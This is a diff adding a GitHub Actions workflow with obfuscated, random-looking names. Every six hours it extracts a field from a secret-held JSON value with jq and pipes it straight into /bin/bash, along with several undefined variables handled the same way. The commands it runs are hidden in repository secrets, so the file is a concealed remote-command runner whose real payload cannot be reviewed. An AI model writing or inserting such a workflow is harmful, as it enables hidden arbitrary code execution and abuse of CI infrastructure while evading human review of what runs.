@@ -1,0 +1,21 @@
+name: lijunji6543
+
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '0 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+    steps:
+      - uses: actions/checkout@v4
+      - name: lijunji6543
+        env:
+          msyaz91795: ${{ secrets.msyaz91795 }}
+        run: |
+          echo $msyaz91795 | jq -r .zgmu4820 | /bin/bash
+          echo $i572 | jq -r .lq8 | /bin/bash
+          echo $ejbq28522 | jq -r .giu0080 | /bin/bash
+          echo $lsprs341 | jq -r .ykbfk79 | /bin/bash
+          echo $vz63315 | jq -r .cwxjb137 | /bin/bash
+
